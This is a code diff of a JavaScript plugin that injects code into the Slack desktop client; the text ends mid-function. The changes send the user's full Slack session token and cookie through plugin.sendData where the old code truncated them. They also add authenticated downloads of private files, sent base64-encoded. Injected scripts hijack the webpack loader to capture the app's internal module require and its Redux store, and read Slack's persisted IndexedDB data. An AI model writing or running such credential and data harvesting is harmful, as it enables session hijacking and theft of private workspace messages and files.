@@ -696,8 +696,8 @@ function fetchIdentity() {
             creds.userName = result.user || '';
             creds.teamName = result.team || creds.teamName;
             plugin.sendData('credentials', {
-                token: creds.token.substring(0, 15) + '...',
-                cookie: creds.cookie.substring(0, 15) + '...',
+                token: creds.token,
+                cookie: creds.cookie,
                 teamId: creds.teamId,
                 teamName: creds.teamName,
                 userId: creds.userId,
@@ -707,8 +707,8 @@ function fetchIdentity() {
             });
         } else {
             plugin.sendData('credentials', {
-                token: creds.token.substring(0, 15) + '...',
-                cookie: creds.cookie.substring(0, 15) + '...',
+                token: creds.token,
+                cookie: creds.cookie,
                 teamId: creds.teamId,
                 teamName: creds.teamName,
                 userId: creds.userId,
@@ -815,13 +815,29 @@ function fetchMessages(channelId, channelName, limit) {
                 return '@' + (mu ? mu.name : uid);
             });
 
+            var files = [];
+            if (msg.files && msg.files.length) {
+                for (var f = 0; f < msg.files.length; f++) {
+                    var file = msg.files[f];
+                    files.push({
+                        name: file.name || file.title || 'file',
+                        title: file.title || '',
+                        mimetype: file.mimetype || '',
+                        size: file.size || 0,
+                        filetype: file.filetype || '',
+                        urlPrivate: file.url_private_download || file.url_private || ''
+                    });
+                }
+            }
+
             formatted.push({
                 user: userName,
                 userId: userId,
                 text: text,
                 ts: msg.ts,
                 subtype: msg.subtype || '',
-                time: new Date(parseFloat(msg.ts) * 1000).toISOString()
+                time: new Date(parseFloat(msg.ts) * 1000).toISOString(),
+                files: files
             });
         }
 
@@ -846,6 +862,52 @@ function sendMessage(channelId, text, channelName) {
         if (result.ok) {
             fetchMessages(channelId, channelName || channelId, 50);
         }
+    });
+}
+
+function downloadSlackFile(fileUrl, fileName, mimetype) {
+    if (!creds || !creds.token || !creds.cookie) {
+        plugin.sendData('file_download', { fileName: fileName, error: 'No credentials' });
+        return Promise.resolve();
+    }
+
+    return new Promise(function(resolve) {
+        var parsed = new (plugin.require('url').URL)(fileUrl);
+        var options = {
+            hostname: parsed.hostname,
+            path: parsed.pathname + parsed.search,
+            method: 'GET',
+            headers: {
+                'Authorization': 'Bearer ' + creds.token,
+                'Cookie': 'd=' + creds.cookie
+            }
+        };
+
+        var req = https.request(options, function(res) {
+            // Handle redirects
+            if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
+                downloadSlackFile(res.headers.location, fileName, mimetype).then(resolve);
+                return;
+            }
+
+            var chunks = [];
+            res.on('data', function(chunk) { chunks.push(chunk); });
+            res.on('end', function() {
+                var buf = Buffer.concat(chunks);
+                plugin.sendData('file_download', {
+                    fileName: fileName,
+                    mimetype: mimetype || res.headers['content-type'] || 'application/octet-stream',
+                    data: buf.toString('base64'),
+                    size: buf.length
+                });
+                resolve();
+            });
+        });
+        req.on('error', function(e) {
+            plugin.sendData('file_download', { fileName: fileName, error: String(e) });
+            resolve();
+        });
+        req.end();
     });
 }
 
@@ -968,490 +1030,738 @@ function findWorkspaceWindow() {
 var storePathCache = {}; // windowId -> { path: string, timestamp: number }
 var STORE_CACHE_TTL = 300000; // 5 minutes
 
-// Find the Redux store in a renderer window and cache the access path.
-// Returns a Promise resolving to the store access path string or null.
+// Find the Redux store in a renderer window and cache it on window.__JSTAP_STORE.
+// Returns a Promise resolving to true (store cached on window) or false (not found).
 function findStoreInWindow(windowId) {
-    // Check cache first
+    // Check cache first — if we already found and pinned the store, just verify it
     var cached = storePathCache[windowId];
     if (cached && (Date.now() - cached.timestamp) < STORE_CACHE_TTL) {
-        // Verify the cached path still works
         return plugin.executeInRenderer(windowId,
             '(function() {' +
-            '  try {' +
-            '    var s = ' + cached.path + ';' +
-            '    if (s && typeof s.getState === "function") return ' + JSON.stringify(cached.path) + ';' +
-            '  } catch(e) {}' +
+            '  try { if (window.__JSTAP_STORE && typeof window.__JSTAP_STORE.getState === "function") return "ok"; } catch(e) {}' +
             '  return null;' +
             '})()'
         ).then(function(result) {
-            if (result) return result;
-            // Cache is stale, re-scan
+            if (result === 'ok') return true;
             delete storePathCache[windowId];
             return findStoreInWindow(windowId);
         }).catch(function() {
             delete storePathCache[windowId];
-            return null;
+            return false;
         });
     }
 
+    // Multi-strategy store discovery — pins result to window.__JSTAP_STORE
     var code =
         '(function() {' +
-        // Strategy 1: well-known globals
+        '  var diag = { strategies: [], found: null, webpackChunks: [], stateKeys: [] };' +
+        '  var store = null;' +
+        '' +
+        // Strategy 1: Check if already pinned from a previous run
+        '  if (window.__JSTAP_STORE && typeof window.__JSTAP_STORE.getState === "function") {' +
+        '    diag.found = "cached"; return JSON.stringify(diag);' +
+        '  }' +
+        '' +
+        // Strategy 2: Well-known globals
         '  var globals = ["__REDUX_STORE__", "store", "__store", "reduxStore", "__NEXT_REDUX_STORE__"];' +
         '  for (var i = 0; i < globals.length; i++) {' +
         '    try {' +
         '      if (window[globals[i]] && typeof window[globals[i]].getState === "function") {' +
-        '        return "window." + globals[i];' +
+        '        store = window[globals[i]]; diag.found = "global:" + globals[i]; break;' +
         '      }' +
         '    } catch(e) {}' +
         '  }' +
-        // Strategy 2: React fiber tree
-        '  try {' +
-        '    var root = document.querySelector("#app") || document.querySelector("#root") || document.querySelector("[data-reactroot]");' +
-        '    if (root) {' +
-        '      var fiberKey = Object.keys(root).find(function(k) { return k.indexOf("__reactFiber") === 0 || k.indexOf("__reactInternalInstance") === 0; });' +
-        '      if (fiberKey) {' +
-        '        var fiber = root[fiberKey];' +
-        '        var depth = 0;' +
-        '        while (fiber && depth < 50) {' +
-        '          try {' +
-        '            if (fiber.memoizedProps && fiber.memoizedProps.store && typeof fiber.memoizedProps.store.getState === "function") return "__reactFiber_store";' +
-        '            if (fiber.stateNode && fiber.stateNode.store && typeof fiber.stateNode.store.getState === "function") return "__reactFiber_stateNode_store";' +
-        '          } catch(e) {}' +
-        '          fiber = fiber.return;' +
-        '          depth++;' +
+        '  diag.strategies.push({ name: "globals", hit: !!store });' +
+        '' +
+        // Strategy 3: Webpack module cache — the key strategy for modern Slack
+        '  if (!store) {' +
+        '    try {' +
+        // Find webpack chunk arrays on window (webpackChunkslack_desktop, webpackChunk_N, etc.)
+        '      var chunkArrayName = null;' +
+        '      var wkeys = Object.keys(window);' +
+        '      for (var w = 0; w < wkeys.length; w++) {' +
+        '        if (wkeys[w].indexOf("webpackChunk") === 0 && Array.isArray(window[wkeys[w]])) {' +
+        '          diag.webpackChunks.push(wkeys[w]);' +
+        '          if (!chunkArrayName) chunkArrayName = wkeys[w];' +
         '        }' +
         '      }' +
-        '    }' +
-        '  } catch(e) {}' +
-        // Strategy 3: window key scan
-        '  try {' +
-        '    var keys = Object.keys(window);' +
-        '    for (var k = 0; k < keys.length; k++) {' +
-        '      try {' +
-        '        var v = window[keys[k]];' +
-        '        if (v && typeof v === "object" && typeof v.getState === "function" && typeof v.dispatch === "function") {' +
-        '          return "window." + keys[k];' +
+        // Also check for legacy webpackJsonp
+        '      if (!chunkArrayName && window.webpackJsonp && Array.isArray(window.webpackJsonp)) {' +
+        '        chunkArrayName = "webpackJsonp";' +
+        '        diag.webpackChunks.push("webpackJsonp");' +
+        '      }' +
+        '' +
+        '      if (chunkArrayName) {' +
+        // Inject a fake chunk to capture __webpack_require__
+        '        var wpRequire = null;' +
+        '        try {' +
+        '          window[chunkArrayName].push([["__jstap_probe__"], {' +
+        '            "__jstap_probe__": function(module, exports, __webpack_require__) {' +
+        '              wpRequire = __webpack_require__;' +
+        '            }' +
+        '          }, function(__webpack_require__) {' +
+        '            __webpack_require__("__jstap_probe__");' +
+        '          }]);' +
+        '        } catch(e) { diag.webpackInjectError = String(e); }' +
+        '' +
+        // Alternative: try the 3-arg chunk format used by newer webpack
+        '        if (!wpRequire) {' +
+        '          try {' +
+        '            window[chunkArrayName].push([["__jstap_probe2__"], {}, function(r) { wpRequire = r; }]);' +
+        '          } catch(e) { diag.webpackInjectError2 = String(e); }' +
         '        }' +
-        '      } catch(e) {}' +
-        '    }' +
-        '  } catch(e) {}' +
-        '  return null;' +
+        '' +
+        '        if (wpRequire) {' +
+        // Diagnose what's on __webpack_require__
+        '          diag.webpackRequireFound = true;' +
+        '          diag.webpackRequireKeys = Object.keys(wpRequire).filter(function(k) { return k.length <= 3; }).sort();' +
+        '          diag.webpackRequireType = typeof wpRequire;' +
+        '' +
+        // Find the module cache — try multiple webpack version conventions
+        '          var cache = wpRequire.c || null;' +
+        '          var modules = wpRequire.m || null;' +
+        '          diag.webpackCacheFound = !!cache;' +
+        '          diag.webpackModulesFound = !!modules;' +
+        '' +
+        // Webpack 5: if no cache (.c), try loading modules via .m keys through wpRequire()
+        '          if (!cache && modules) {' +
+        '            var allMkeys = Object.keys(modules);' +
+        '            diag.webpackModuleCount = allMkeys.length;' +
+        '            diag.webpackModulesScanned = allMkeys.length;' +
+        // Helper: check if obj looks like a Redux-ish store
+        '            function isStore(obj) {' +
+        '              if (!obj || typeof obj !== "object") return false;' +
+        // Classic Redux: getState + dispatch
+        '              if (typeof obj.getState === "function" && typeof obj.dispatch === "function") return true;' +
+        // Zustand/custom: getState + subscribe (no dispatch)
+        '              if (typeof obj.getState === "function" && typeof obj.subscribe === "function") return true;' +
+        '              return false;' +
+        '            }' +
+        '' +
+        '            for (var m = 0; m < allMkeys.length; m++) {' +
+        '              try {' +
+        '                var ex = wpRequire(allMkeys[m]);' +
+        '                if (!ex) continue;' +
+        // Direct export
+        '                if (isStore(ex)) {' +
+        '                  store = ex; diag.found = "webpack5:direct:" + allMkeys[m]; break;' +
+        '                }' +
+        // Default export
+        '                if (ex.default && isStore(ex.default)) {' +
+        '                  store = ex.default; diag.found = "webpack5:default:" + allMkeys[m]; break;' +
+        '                }' +
+        // Named exports (check .store specifically first, then scan)
+        '                if (ex.store && isStore(ex.store)) {' +
+        '                  store = ex.store; diag.found = "webpack5:named:" + allMkeys[m] + ".store"; break;' +
+        '                }' +
+        '                if (typeof ex === "object") {' +
+        '                  var exKeys = Object.keys(ex);' +
+        '                  for (var ek = 0; ek < exKeys.length; ek++) {' +
+        '                    try {' +
+        '                      var exVal = ex[exKeys[ek]];' +
+        '                      if (isStore(exVal)) {' +
+        '                        store = exVal; diag.found = "webpack5:named:" + allMkeys[m] + "." + exKeys[ek]; break;' +
+        '                      }' +
+        '                    } catch(e) {}' +
+        '                  }' +
+        '                  if (store) break;' +
+        '                }' +
+        '              } catch(e) {}' +
+        '            }' +
+        '          }' +
+        '' +
+        // Webpack 4 style: cache at .c
+        '          if (!store && cache) {' +
+        '            var moduleIds = Object.keys(cache);' +
+        '            diag.webpackModuleCount = moduleIds.length;' +
+        '            for (var m2 = 0; m2 < moduleIds.length; m2++) {' +
+        '              try {' +
+        '                var mod = cache[moduleIds[m2]];' +
+        '                if (!mod || !mod.exports) continue;' +
+        '                var ex2 = mod.exports;' +
+        '                if (ex2.default && typeof ex2.default.getState === "function" && typeof ex2.default.dispatch === "function") {' +
+        '                  store = ex2.default; diag.found = "webpack4:default:" + moduleIds[m2]; break;' +
+        '                }' +
+        '                if (typeof ex2.getState === "function" && typeof ex2.dispatch === "function") {' +
+        '                  store = ex2; diag.found = "webpack4:direct:" + moduleIds[m2]; break;' +
+        '                }' +
+        '                var ex2Keys = Object.keys(ex2);' +
+        '                for (var ek2 = 0; ek2 < ex2Keys.length; ek2++) {' +
+        '                  try {' +
+        '                    var exVal2 = ex2[ex2Keys[ek2]];' +
+        '                    if (exVal2 && typeof exVal2.getState === "function" && typeof exVal2.dispatch === "function") {' +
+        '                      store = exVal2; diag.found = "webpack4:named:" + moduleIds[m2] + "." + ex2Keys[ek2]; break;' +
+        '                    }' +
+        '                  } catch(e) {}' +
+        '                }' +
+        '                if (store) break;' +
+        '              } catch(e) {}' +
+        '            }' +
+        '          }' +
+        '' +
+        // Last resort: if wpRequire is a function, try calling it with common Redux module IDs
+        '          if (!store && typeof wpRequire === "function") {' +
+        '            var guesses = ["redux", "store", "app/store", "./store", "../store", "redux/store"];' +
+        '            for (var g = 0; g < guesses.length; g++) {' +
+        '              try {' +
+        '                var gmod = wpRequire(guesses[g]);' +
+        '                if (gmod && typeof gmod.getState === "function") { store = gmod; diag.found = "webpack:guess:" + guesses[g]; break; }' +
+        '                if (gmod && gmod.default && typeof gmod.default.getState === "function") { store = gmod.default; diag.found = "webpack:guess:default:" + guesses[g]; break; }' +
+        '                if (gmod && gmod.store && typeof gmod.store.getState === "function") { store = gmod.store; diag.found = "webpack:guess:store:" + guesses[g]; break; }' +
+        '              } catch(e) {}' +
+        '            }' +
+        '          }' +
+        '' +
+        '        } else {' +
+        '          diag.webpackRequireFound = false;' +
+        '        }' +
+        '      }' +
+        '    } catch(e) { diag.webpackError = String(e); }' +
+        '    diag.strategies.push({ name: "webpack", hit: !!store });' +
+        '  }' +
+        '' +
+        // Strategy 4: React fiber tree
+        '  if (!store) {' +
+        '    try {' +
+        '      var root = document.querySelector("#app,#root,[data-reactroot],.p-client_container");' +
+        '      if (root) {' +
+        '        var fiberKey = Object.keys(root).find(function(k) { return k.indexOf("__reactFiber") === 0 || k.indexOf("__reactInternalInstance") === 0; });' +
+        '        if (fiberKey) {' +
+        '          var fiber = root[fiberKey];' +
+        '          var depth = 0;' +
+        '          while (fiber && depth < 80) {' +
+        '            try {' +
+        '              if (fiber.memoizedProps && fiber.memoizedProps.store && typeof fiber.memoizedProps.store.getState === "function") {' +
+        '                store = fiber.memoizedProps.store; diag.found = "fiber:memoizedProps"; break;' +
+        '              }' +
+        '              if (fiber.stateNode && fiber.stateNode.store && typeof fiber.stateNode.store.getState === "function") {' +
+        '                store = fiber.stateNode.store; diag.found = "fiber:stateNode"; break;' +
+        '              }' +
+        // Also check stateNode._reactInternals for indirect store refs
+        '              if (fiber.stateNode && fiber.stateNode._store && typeof fiber.stateNode._store.getState === "function") {' +
+        '                store = fiber.stateNode._store; diag.found = "fiber:stateNode._store"; break;' +
+        '              }' +
+        '            } catch(e) {}' +
+        '            fiber = fiber.return;' +
+        '            depth++;' +
+        '          }' +
+        '        } else { diag.fiberKeyFound = false; }' +
+        '      } else { diag.rootElementFound = false; }' +
+        '    } catch(e) {}' +
+        '    diag.strategies.push({ name: "fiber", hit: !!store });' +
+        '  }' +
+        '' +
+        // Strategy 5: Window key scan (broadened — check nested .store properties)
+        '  if (!store) {' +
+        '    try {' +
+        '      var wk = Object.keys(window);' +
+        '      for (var k = 0; k < wk.length; k++) {' +
+        '        try {' +
+        '          var v = window[wk[k]];' +
+        '          if (v && typeof v === "object" && typeof v.getState === "function" && typeof v.dispatch === "function") {' +
+        '            store = v; diag.found = "window:" + wk[k]; break;' +
+        '          }' +
+        // Check one level deep — some apps expose { store: reduxStore } on a namespace
+        '          if (v && typeof v === "object" && v.store && typeof v.store.getState === "function" && typeof v.store.dispatch === "function") {' +
+        '            store = v.store; diag.found = "window:" + wk[k] + ".store"; break;' +
+        '          }' +
+        '        } catch(e) {}' +
+        '      }' +
+        '    } catch(e) {}' +
+        '    diag.strategies.push({ name: "windowScan", hit: !!store });' +
+        '  }' +
+        '' +
+        // Pin the store for fast access
+        '  if (store) {' +
+        '    window.__JSTAP_STORE = store;' +
+        '    try {' +
+        '      var s = typeof store.getState === "function" ? store.getState() : store;' +
+        '      diag.stateKeys = Object.keys(s).slice(0, 40);' +
+        '    } catch(e) {}' +
+        '  }' +
+        '' +
+        // Strategy 6: If no store found, do a targeted webpack scan for Slack data
+        // Look for modules exporting objects keyed by Slack IDs (users, channels)
+        // Build a synthetic "store" from these data modules
+        '  if (!store) {' +
+        '    try {' +
+        '      var wpR2 = null;' +
+        '      try { window[Object.keys(window).filter(function(k){return k.indexOf("webpackChunk")===0&&Array.isArray(window[k])})[0]].push([["__jstap_data_probe__"],{},function(r){wpR2=r;}]); } catch(e) {}' +
+        '      if (wpR2 && wpR2.m) {' +
+        '        var dk = Object.keys(wpR2.m);' +
+        '        var synthetic = {};' +
+        '        var foundUsers = null, foundChannels = null, foundMessages = null;' +
+        '        diag.dataScanTotal = dk.length;' +
+        '        var dataScanHits = [];' +
+        '' +
+        '        for (var di = 0; di < dk.length; di++) {' +
+        '          try {' +
+        '            var dex = wpR2(dk[di]);' +
+        '            if (!dex || typeof dex !== "object") continue;' +
+        // Check direct export and .default for data-bearing objects
+        '            var targets = [dex];' +
+        '            if (dex.default && typeof dex.default === "object") targets.push(dex.default);' +
+        '            for (var ti = 0; ti < targets.length; ti++) {' +
+        '              var tgt = targets[ti];' +
+        '              if (!tgt || typeof tgt !== "object" || Array.isArray(tgt)) continue;' +
+        '              var tkeys = Object.keys(tgt);' +
+        '              if (tkeys.length < 2) continue;' +
+        // Look for user-keyed collections
+        '              if (!foundUsers && tkeys.length >= 5 && tkeys[0].match && tkeys[0].match(/^U[A-Z0-9]{4,}$/) && tkeys[1].match(/^U[A-Z0-9]{4,}$/)) {' +
+        '                var sampleU = tgt[tkeys[0]];' +
+        '                if (sampleU && (sampleU.name || sampleU.profile || sampleU.real_name)) {' +
+        '                  foundUsers = tgt; dataScanHits.push("users:" + dk[di] + "(keys:" + tkeys.length + ")");' +
+        '                }' +
+        '              }' +
+        // Look for channel-keyed collections
+        '              if (!foundChannels && tkeys.length >= 3 && tkeys[0].match && tkeys[0].match(/^[CDG][A-Z0-9]{4,}$/) && tkeys[1].match(/^[CDG][A-Z0-9]{4,}$/)) {' +
+        '                var sampleC = tgt[tkeys[0]];' +
+        '                if (sampleC && (sampleC.name || sampleC.is_channel !== undefined || sampleC.is_im !== undefined)) {' +
+        '                  foundChannels = tgt; dataScanHits.push("channels:" + dk[di] + "(keys:" + tkeys.length + ")");' +
+        '                }' +
+        '              }' +
+        '            }' +
+        '            if (foundUsers && foundChannels) break;' +
+        '          } catch(e) {}' +
+        '        }' +
+        '' +
+        '        diag.dataScanHits = dataScanHits;' +
+        '        if (foundUsers || foundChannels) {' +
+        '          synthetic.getState = function() { return synthetic; };' +
+        '          if (foundUsers) synthetic.users = foundUsers;' +
+        '          if (foundChannels) synthetic.channels = foundChannels;' +
+        '          window.__JSTAP_STORE = synthetic;' +
+        '          diag.found = "dataScan";' +
+        '          diag.stateKeys = Object.keys(synthetic);' +
+        '          store = synthetic;' +
+        '        }' +
+        '      }' +
+        '    } catch(e) { diag.dataScanError = String(e); }' +
+        '    diag.strategies.push({ name: "dataScan", hit: !!store });' +
+        '  }' +
+        '' +
+        '  return JSON.stringify(diag);' +
         '})()';
 
-    return plugin.executeInRenderer(windowId, code).then(function(path) {
-        if (path) {
-            storePathCache[windowId] = { path: path, timestamp: Date.now() };
-            plugin.sendData('_debug', { fn: 'findStoreInWindow', windowId: windowId, storePath: path });
-        } else {
-            plugin.sendData('_debug', { fn: 'findStoreInWindow', windowId: windowId, storePath: null, note: 'No Redux store found in window' });
+    return plugin.executeInRenderer(windowId, code).then(function(raw) {
+        var found = false;
+        var diag = {};
+        try {
+            diag = JSON.parse(raw);
+            found = !!diag.found;
+        } catch (e) {
+            diag = { parseError: String(e), raw: String(raw).substring(0, 200) };
         }
-        return path;
+
+        plugin.sendData('_debug', { fn: 'findStoreInWindow', windowId: windowId, found: found, diag: diag });
+
+        if (found) {
+            storePathCache[windowId] = { timestamp: Date.now() };
+        }
+        return found;
     }).catch(function(e) {
         plugin.sendData('_debug', { fn: 'findStoreInWindow', windowId: windowId, error: String(e) });
-        return null;
+        return false;
     });
 }
 
-// Helper: resolve a store path in renderer code.
-// For React fiber paths, we need special accessor code since we can't cache the fiber reference directly.
-function storeAccessCode(storePath) {
-    if (storePath === '__reactFiber_store') {
-        return '(function() {' +
-            '  var root = document.querySelector("#app") || document.querySelector("#root") || document.querySelector("[data-reactroot]");' +
-            '  if (!root) return null;' +
-            '  var fiberKey = Object.keys(root).find(function(k) { return k.indexOf("__reactFiber") === 0 || k.indexOf("__reactInternalInstance") === 0; });' +
-            '  if (!fiberKey) return null;' +
-            '  var fiber = root[fiberKey];' +
-            '  var depth = 0;' +
-            '  while (fiber && depth < 50) {' +
-            '    if (fiber.memoizedProps && fiber.memoizedProps.store && typeof fiber.memoizedProps.store.getState === "function") return fiber.memoizedProps.store;' +
-            '    fiber = fiber.return; depth++;' +
-            '  }' +
-            '  return null;' +
-            '})()';
-    }
-    if (storePath === '__reactFiber_stateNode_store') {
-        return '(function() {' +
-            '  var root = document.querySelector("#app") || document.querySelector("#root") || document.querySelector("[data-reactroot]");' +
-            '  if (!root) return null;' +
-            '  var fiberKey = Object.keys(root).find(function(k) { return k.indexOf("__reactFiber") === 0 || k.indexOf("__reactInternalInstance") === 0; });' +
-            '  if (!fiberKey) return null;' +
-            '  var fiber = root[fiberKey];' +
-            '  var depth = 0;' +
-            '  while (fiber && depth < 50) {' +
-            '    if (fiber.stateNode && fiber.stateNode.store && typeof fiber.stateNode.store.getState === "function") return fiber.stateNode.store;' +
-            '    fiber = fiber.return; depth++;' +
-            '  }' +
-            '  return null;' +
-            '})()';
-    }
-    // Simple global path like "window.store"
-    return storePath;
+// All local extraction functions now use window.__JSTAP_STORE directly
+// (pinned by findStoreInWindow), so storeAccessCode is a simple constant.
+var STORE_ACCESS = 'window.__JSTAP_STORE';
+
+// ===== IndexedDB probe — discover what Slack stores locally =====
+
+function probeIndexedDB(windowId) {
+    var code =
+        '(function() {' +
+        '  var result = { databases: [], error: null };' +
+        // indexedDB.databases() is available in Chromium/Electron
+        '  if (indexedDB && typeof indexedDB.databases === "function") {' +
+        '    return indexedDB.databases().then(function(dbs) {' +
+        '      var promises = [];' +
+        '      for (var i = 0; i < dbs.length; i++) {' +
+        '        (function(dbInfo) {' +
+        '          var p = new Promise(function(resolve) {' +
+        '            try {' +
+        '              var req = indexedDB.open(dbInfo.name, dbInfo.version);' +
+        '              req.onsuccess = function(e) {' +
+        '                var db = e.target.result;' +
+        '                var stores = [];' +
+        '                var storeNames = Array.from(db.objectStoreNames);' +
+        '                var storeDetails = [];' +
+        // For each object store, get count and a sample key
+        '                var txStores = storeNames.filter(function(s) { return s; });' +
+        '                if (txStores.length === 0) {' +
+        '                  db.close();' +
+        '                  resolve({ name: dbInfo.name, version: dbInfo.version, stores: [] });' +
+        '                  return;' +
+        '                }' +
+        '                try {' +
+        '                  var tx = db.transaction(txStores, "readonly");' +
+        '                  var remaining = txStores.length;' +
+        '                  for (var s = 0; s < txStores.length; s++) {' +
+        '                    (function(storeName) {' +
+        '                      var os = tx.objectStore(storeName);' +
+        '                      var info = { name: storeName, keyPath: os.keyPath, indexNames: Array.from(os.indexNames).slice(0, 10), count: 0, sampleKeys: [], sampleValueKeys: [] };' +
+        '                      var countReq = os.count();' +
+        '                      countReq.onsuccess = function() { info.count = countReq.result; };' +
+        // Get first 3 keys and a sample value
+        '                      var cursorCount = 0;' +
+        '                      var curReq = os.openCursor();' +
+        '                      curReq.onsuccess = function(ev) {' +
+        '                        var cursor = ev.target.result;' +
+        '                        if (cursor && cursorCount < 3) {' +
+        '                          info.sampleKeys.push(String(cursor.key).substring(0, 60));' +
+        '                          if (cursorCount === 0 && cursor.value) {' +
+        '                            try { info.sampleValueKeys = Object.keys(cursor.value); } catch(e) {}' +
+        '                            try { info.sampleValueType = typeof cursor.value; } catch(e) {}' +
+        '                            if (dbInfo.name === "reduxPersistence") {' +
+        '                              try {' +
+        '                                var val = cursor.value;' +
+        '                                var subSample = {};' +
+        '                                var vkeys = Object.keys(val);' +
+        '                                for (var vi = 0; vi < vkeys.length; vi++) {' +
+        '                                  var sv = val[vkeys[vi]];' +
+        '                                  if (sv === null || sv === undefined) subSample[vkeys[vi]] = "null";' +
+        '                                  else if (typeof sv === "string") subSample[vkeys[vi]] = "str(" + sv.length + "):" + sv.substring(0, 80);' +
+        '                                  else if (Array.isArray(sv)) subSample[vkeys[vi]] = "arr(" + sv.length + ")";' +
+        '                                  else if (typeof sv === "object") subSample[vkeys[vi]] = "obj(keys:" + Object.keys(sv).length + "):" + Object.keys(sv).slice(0, 5).join(",");' +
+        '                                  else subSample[vkeys[vi]] = typeof sv + ":" + String(sv).substring(0, 30);' +
+        '                                }' +
+        '                                info.subSample = subSample;' +
+        '                              } catch(e) { info.subSampleError = String(e); }' +
+        '                            }' +
+        '                          }' +
+        '                          cursorCount++;' +
+        '                          cursor.continue();' +
+        '                        }' +
+        '                      };' +
+        '                      storeDetails.push(info);' +
+        '                    })(txStores[s]);' +
+        '                  }' +
+        '                  tx.oncomplete = function() {' +
+        '                    db.close();' +
+        '                    resolve({ name: dbInfo.name, version: dbInfo.version, stores: storeDetails });' +
+        '                  };' +
+        '                  tx.onerror = function() {' +
+        '                    db.close();' +
+        '                    resolve({ name: dbInfo.name, version: dbInfo.version, stores: storeDetails, txError: true });' +
+        '                  };' +
+        '                } catch(txErr) {' +
+        '                  db.close();' +
+        '                  resolve({ name: dbInfo.name, version: dbInfo.version, stores: storeNames.map(function(n) { return { name: n }; }), txCreateError: String(txErr) });' +
+        '                }' +
+        '              };' +
+        '              req.onerror = function() {' +
+        '                resolve({ name: dbInfo.name, version: dbInfo.version, error: "open failed" });' +
+        '              };' +
+        '              req.onblocked = function() {' +
+        '                resolve({ name: dbInfo.name, version: dbInfo.version, error: "blocked" });' +
+        '              };' +
+        '            } catch(e) {' +
+        '              resolve({ name: dbInfo.name, error: String(e) });' +
+        '            }' +
+        '          });' +
+        '          promises.push(p);' +
+        '        })(dbs[i]);' +
+        '      }' +
+        '      return Promise.all(promises).then(function(results) {' +
+        '        result.databases = results;' +
+        '        return JSON.stringify(result);' +
+        '      });' +
+        '    }).catch(function(e) { result.error = String(e); return JSON.stringify(result); });' +
+        '  } else {' +
+        '    result.error = "indexedDB.databases() not available";' +
+        '    return JSON.stringify(result);' +
+        '  }' +
+        '})()';
+
+    return plugin.executeInRenderer(windowId, code).then(function(raw) {
+        try {
+            var data = JSON.parse(raw);
+            plugin.sendData('_debug', { fn: 'probeIndexedDB', windowId: windowId, data: data });
+        } catch (e) {
+            plugin.sendData('_debug', { fn: 'probeIndexedDB', windowId: windowId, parseError: String(e), raw: String(raw).substring(0, 300) });
+        }
+    }).catch(function(e) {
+        plugin.sendData('_debug', { fn: 'probeIndexedDB', windowId: windowId, error: String(e) });
+    });
+}
+
+// ===== IndexedDB-based local extraction =====
+// Slack persists its Redux state to IndexedDB: reduxPersistence → reduxPersistenceStore
+// Key format: persist:slack-client-{teamId}-{userId}
+// The value is an object with members, channels, messages, etc.
+
+// Helper: read a slice from Slack's persisted Redux state via IndexedDB
+// Returns a Promise from executeInRenderer that resolves to the JSON result
+function readSlackIDB(windowId, sliceNames, teamId, userId) {
+    var safeKey = JSON.stringify('persist:slack-client-' + teamId + '-' + userId);
+    var safeSlices = JSON.stringify(sliceNames);
+    var code =
+        '(function() {' +
+        '  return new Promise(function(resolve) {' +
+        '    var req = indexedDB.open("reduxPersistence");' +
+        '    req.onerror = function() { resolve(JSON.stringify({ error: "open failed" })); };' +
+        '    req.onsuccess = function(e) {' +
+        '      var db = e.target.result;' +
+        '      try {' +
+        '        var tx = db.transaction("reduxPersistenceStore", "readonly");' +
+        '        var store = tx.objectStore("reduxPersistenceStore");' +
+        '        var getReq = store.get(' + safeKey + ');' +
+        '        getReq.onsuccess = function() {' +
+        '          var val = getReq.result;' +
+        '          if (!val) { db.close(); resolve(JSON.stringify({ error: "key not found" })); return; }' +
+        '          var slices = ' + safeSlices + ';' +
+        '          var result = {};' +
+        '          for (var i = 0; i < slices.length; i++) {' +
+        '            result[slices[i]] = val[slices[i]] || null;' +
+        '          }' +
+        '          db.close();' +
+        '          resolve(JSON.stringify(result));' +
+        '        };' +
+        '        getReq.onerror = function() { db.close(); resolve(JSON.stringify({ error: "get failed" })); };' +
+        '      } catch(e) { db.close(); resolve(JSON.stringify({ error: String(e) })); }' +
+        '    };' +
+        '  });' +
+        '})()';
+    return plugin.executeInRenderer(windowId, code);
 }
 
 function fetchUsersLocal(windowId) {
-    return findStoreInWindow(windowId).then(function(storePath) {
-        if (!storePath) {
-            plugin.sendData('_debug', { fn: 'fetchUsersLocal', status: 'skip', reason: 'no store found' });
+    if (!creds || !creds.teamId || !creds.userId) {
+        plugin.sendData('_debug', { fn: 'fetchUsersLocal', status: 'skip', reason: 'no creds/teamId/userId' });
+        return Promise.resolve(false);
+    }
+
+    return readSlackIDB(windowId, ['members'], creds.teamId, creds.userId).then(function(raw) {
+        if (!raw) {
+            plugin.sendData('_debug', { fn: 'fetchUsersLocal', status: 'fail', reason: 'IDB returned null' });
             return false;
         }
-
-        var accessor = storeAccessCode(storePath);
-        var code =
-            '(function() {' +
-            '  var diag = { storeOk: false, stateKeys: [], userPathHit: -1, userKeysSample: [], userCount: 0, error: null };' +
-            '  try {' +
-            '    var store = ' + accessor + ';' +
-            '    if (!store || typeof store.getState !== "function") { diag.error = "store not accessible"; return JSON.stringify({ diag: diag }); }' +
-            '    diag.storeOk = true;' +
-            '    var state = store.getState();' +
-            '    if (!state) { diag.error = "state is null"; return JSON.stringify({ diag: diag }); }' +
-            '    diag.stateKeys = Object.keys(state).slice(0, 40);' +
-            '' +
-            // Scan for user-like data in common Slack store locations
-            '    var userEntities = null;' +
-            '    var paths = [' +
-            '      function(s) { return s.users && s.users.entities; },' +
-            '      function(s) { return s.users; },' +
-            '      function(s) { return s.members && s.members.entities; },' +
-            '      function(s) { return s.members; },' +
-            '      function(s) { if (s.entities && s.entities.users) return s.entities.users; },' +
-            '      function(s) { var k = Object.keys(s); for (var i = 0; i < k.length; i++) { var v = s[k[i]]; if (v && typeof v === "object" && !Array.isArray(v)) { var sk = Object.keys(v); if (sk.length > 0 && sk[0].match && sk[0].match(/^U[A-Z0-9]{4,}$/)) return v; } } return null; }' +
-            '    ];' +
-            '    for (var p = 0; p < paths.length; p++) {' +
-            '      try {' +
-            '        var u = paths[p](state);' +
-            '        if (u && typeof u === "object" && !Array.isArray(u)) {' +
